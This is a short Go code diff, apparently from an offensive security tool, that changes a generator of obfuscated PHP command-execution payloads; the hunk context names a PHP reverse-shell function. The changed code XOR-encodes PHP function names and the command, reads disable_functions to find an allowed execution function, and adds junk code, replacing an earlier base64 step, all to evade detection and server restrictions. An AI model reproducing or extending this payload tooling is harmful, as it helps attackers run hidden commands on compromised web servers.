@@ -66,7 +66,6 @@ func phpReverseShell(lhost string, lport int) string {
 func phpExecCmd(cmd string) string {
 	enc := phpXorLiteral
 
-	b64 := sdk.Base64Encode(cmd)
 	v := phpVars("d", "c", "f", "r", "p")
 	d, c, f, r, p := v["d"], v["c"], v["f"], v["r"], v["p"]
 
@@ -124,7 +123,6 @@ func phpExecCmd(cmd string) string {
 	})
 
 	vIni := phpVarName()
-	vB64 := phpVarName()
 
 	j1, j2, j3 := phpMaybeJunk(enc), phpMaybeJunk(enc), phpMaybeJunk(enc)
 
@@ -136,14 +134,14 @@ func phpExecCmd(cmd string) string {
 		sdk.Sprintf(`%s;$%s=%s;break;`, call, r, phpOne(enc)))
 
 	return sdk.Sprintf(`%s;%s;%s;%s`+
-		`$%s=%s;$%s=%s;$%s=@$%s(%s);$%s=$%s('%s');`+
+		`$%s=%s;$%s=@$%s(%s);$%s=%s;`+
 		`%s`+
 		`$%s=%s;%s`+
 		`foreach([%s,%s,%s,%s] as $%s){%s}`+
 		`%s%s%s%s%s`,
 		preamble[0], preamble[1], preamble[2], j1,
-		vIni, enc("ini_get"), vB64, enc("base64_decode"),
-		d, vIni, enc("disable_functions"), c, vB64, b64,
+		vIni, enc("ini_get"),
+		d, vIni, enc("disable_functions"), c, enc(cmd),
 		osCheck,
 		r, phpZero(enc), j2,
 		encoded[0], encoded[1], encoded[2], encoded[3], f, foreachBody,
